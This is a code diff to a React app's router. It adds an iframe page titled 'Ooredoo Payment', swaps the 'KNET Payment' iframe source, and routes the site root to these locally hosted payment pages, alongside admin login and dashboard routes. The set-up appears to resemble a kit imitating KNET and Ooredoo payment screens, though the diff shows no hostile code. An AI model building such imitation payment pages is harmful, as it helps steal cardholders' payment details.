@@ -15,10 +15,20 @@ import AdminDashboard from "@/pages/AdminDashboard";
 import AdminLogin from "@/pages/AdminLogin";
 
 // Wrapper components for HTML pages
+const HomePage = () => {
+  return (
+    <iframe
+      src="/index.html"
+      style={{ width: '100%', height: '100vh', border: 'none' }}
+      title="Ooredoo Payment"
+    />
+  );
+};
+
 const KnetPage = () => {
   return (
     <iframe
-      src="/knetwait.html"
+      src="/knetpage.html"
       style={{ width: '100%', height: '100vh', border: 'none' }}
       title="KNET Payment"
     />
@@ -70,8 +80,8 @@ function Router() {
   // make sure to consider if you need authentication for certain routes
   return (
     <Switch>
-      <Route path={"/"} component={KnetPage} />
-      <Route path={"/en"} component={KnetPage} />
+      <Route path={"/"} component={HomePage} />
+      <Route path={"/en"} component={HomePage} />
       <Route path={"/pay"} component={Pay} />
       <Route path={"/pay-en"} component={PayEn} />
       <Route path="/unified-payment" component={UnifiedPayment} />
